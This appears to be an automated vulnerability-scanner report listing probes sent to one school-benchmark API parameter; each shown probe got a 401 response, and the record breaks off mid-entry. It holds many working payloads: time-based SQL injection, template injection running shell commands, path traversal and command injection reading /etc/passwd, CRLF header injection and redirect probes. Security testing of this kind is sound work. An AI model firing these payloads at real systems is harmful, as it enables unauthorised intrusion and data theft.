* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527%2528&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%252F%252F1498374535918995670.owasp.org&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%252Fetc%252Fpasswd&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%252Fuser-data&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%252FWEB-INF%252Fweb.xml&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253B&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253C%2521--&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%255Cuser-data&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%255CWEB-INF%255Cweb.xml&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%255D%255D%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%257Bsystem%2528%2522sleep+15%2522%2529%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=0W45pz4p&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=1498374535918995670.owasp.org&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=any%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=any%253F%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=c%253A%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=c%253A%252FWindows%252Fsystem.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=c%253A%255C&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=c%253A%255CWindows%255Csystem.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=cat+%252Fetc%252Fpasswd&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=get-help&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252F%255C1498374535918995670.owasp.org&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252F1498374535918995670.owasp.org&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252Fwww.google.com%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252Fwww.google.com%253A80%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=http%253A%252F%252Fwww.google.com&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=https%253A%252F%252F%255C1498374535918995670.owasp.org&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=https%253A%252F%252F1498374535918995670.owasp.org&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=lvq78hns3f1sp64zscwbjzkazvqbje2flrjv877jwx1u8y8eu34lu0ft7&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=n3lgpxo5vrc36aithnt3q5v0g13zqk8jqsxcoh2n729yuvgiuff52ufco69&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%2526sleep+15.0%2526%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%2526timeout+%252FT+15.0%2526%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%253Bget-help&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%253Bsleep+15.0%253B%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%253Bstart-sleep+-s+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%257Ctimeout+%252FT+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+%252F+sleep%252815%2529+%252F+%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
